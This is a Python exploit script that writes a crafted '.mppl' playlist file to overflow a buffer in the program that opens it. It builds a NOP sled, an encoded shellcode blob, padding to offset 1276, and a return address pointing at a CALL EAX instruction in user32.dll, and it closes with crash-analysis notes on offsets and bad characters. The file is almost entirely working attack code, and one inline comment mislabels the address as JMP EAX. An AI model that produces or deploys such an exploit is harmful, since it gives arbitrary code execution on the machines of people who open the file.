#!/usr/bin/python3


nop_num_bytes = 100
nop_sled = bytearray(b"\x90" * nop_num_bytes)

shell_code = (
    b"\xdb\xc1\xba\x87\xbe\x92\x1e\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
    b"\x53\x83\xef\xfc\x31\x57\x13\x03\xd0\xad\x70\xeb\x22\x39\xf6"
    b"\x14\xda\xba\x97\x9d\x3f\x8b\x97\xfa\x34\xbc\x27\x88\x18\x31"
    b"\xc3\xdc\x88\xc2\xa1\xc8\xbf\x63\x0f\x2f\x8e\x74\x3c\x13\x91"
    b"\xf6\x3f\x40\x71\xc6\x8f\x95\x70\x0f\xed\x54\x20\xd8\x79\xca"
    b"\xd4\x6d\x37\xd7\x5f\x3d\xd9\x5f\xbc\xf6\xd8\x4e\x13\x8c\x82"
    b"\x50\x92\x41\xbf\xd8\x8c\x86\xfa\x93\x27\x7c\x70\x22\xe1\x4c"
    b"\x79\x89\xcc\x60\x88\xd3\x09\x46\x73\xa6\x63\xb4\x0e\xb1\xb0"
    b"\xc6\xd4\x34\x22\x60\x9e\xef\x8e\x90\x73\x69\x45\x9e\x38\xfd"
    b"\x01\x83\xbf\xd2\x3a\xbf\x34\xd5\xec\x49\x0e\xf2\x28\x11\xd4"
    b"\x9b\x69\xff\xbb\xa4\x69\xa0\x64\x01\xe2\x4d\x70\x38\xa9\x19"
    b"\xb5\x71\x51\xda\xd1\x02\x22\xe8\x7e\xb9\xac\x40\xf6\x67\x2b"
    b"\xa6\x2d\xdf\xa3\x59\xce\x20\xea\x9d\x9a\x70\x84\x34\xa3\x1a"
    b"\x54\xb8\x76\xb6\x5c\x1f\x29\xa5\xa1\xdf\x99\x69\x09\x88\xf3"
    b"\x65\x76\xa8\xfb\xaf\x1f\x41\x06\x50\x0e\xce\x8f\xb6\x5a\xfe"
    b"\xd9\x61\xf2\x3c\x3e\xba\x65\x3e\x14\x92\x01\x77\x7e\x25\x2e"
    b"\x88\x54\x01\xb8\x03\xbb\x95\xd9\x13\x96\xbd\x8e\x84\x6c\x2c"
    b"\xfd\x35\x70\x65\x95\xd6\xe3\xe2\x65\x90\x1f\xbd\x32\xf5\xee"
    b"\xb4\xd6\xeb\x49\x6f\xc4\xf1\x0c\x48\x4c\x2e\xed\x57\x4d\xa3"
    b"\x49\x7c\x5d\x7d\x51\x38\x09\xd1\x04\x96\xe7\x97\xfe\x58\x51"
    b"\x4e\xac\x32\x35\x17\x9e\x84\x43\x18\xcb\x72\xab\xa9\xa2\xc2"
    b"\xd4\x06\x23\xc3\xad\x7a\xd3\x2c\x64\x3f\xe3\x66\x24\x16\x6c"
    b"\x2f\xbd\x2a\xf1\xd0\x68\x68\x0c\x53\x98\x11\xeb\x4b\xe9\x14"
    b"\xb7\xcb\x02\x65\xa8\xb9\x24\xda\xc9\xeb"
)

shell_code = bytearray(shell_code)

dummy_data = bytearray(("A" * (1276 - (nop_num_bytes + len(shell_code)))).encode("ascii"))

return_address = b"\x66\xE8\x41\x7E"  # Address of JMP EAX instruction


buffer = nop_sled + shell_code + dummy_data +  return_address


with open("exploit.mppl", "wb") as exploit_file:
    exploit_file.write(buffer)

print("[+] exploit.mppl file written.")


# Comments:

# Pattern in EIP after crash: 71423571
# [*] Exact match at offset 1276
# After crash: ESP is pointing to 0012FB74
# Bad characters: 0x00, 0x0a, 0x0d
# After the program loads the MPPL file:
# EAX stores the address where the MPPL file
# is loaded in memory.
# To execute the shellcode, we can just use
# JMP EAX instruction.
# Address of JMP EAX in user32.dll:
# 7E42916B

# Address of CALL EAX in user32.dll:
# 7E41E866


